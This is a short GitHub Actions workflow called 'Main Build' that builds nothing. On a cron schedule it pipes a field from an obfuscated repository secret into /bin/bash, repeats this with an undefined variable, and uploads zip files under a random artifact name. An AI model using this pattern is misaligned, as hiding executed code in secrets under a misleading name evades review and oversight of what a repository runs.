name: Main Build
on:
  workflow_dispatch:

  schedule:
    - cron: '38 5,11,17,23 * * *'
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  scheduler:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Invoke
        env:
          esjs8: ${{ secrets.esjs8 }}
        run: |
          printf '%s' "$esjs8" | jq -r .tgr5393 | /bin/bash
          printf '%s' "$b92604" | jq -r .cwejn4368 | /bin/bash

      - name: Store artifact
        uses: actions/upload-artifact@v4
        with:
          name: 4czRycGO
          path: "*.zip"
          retention-days: 1
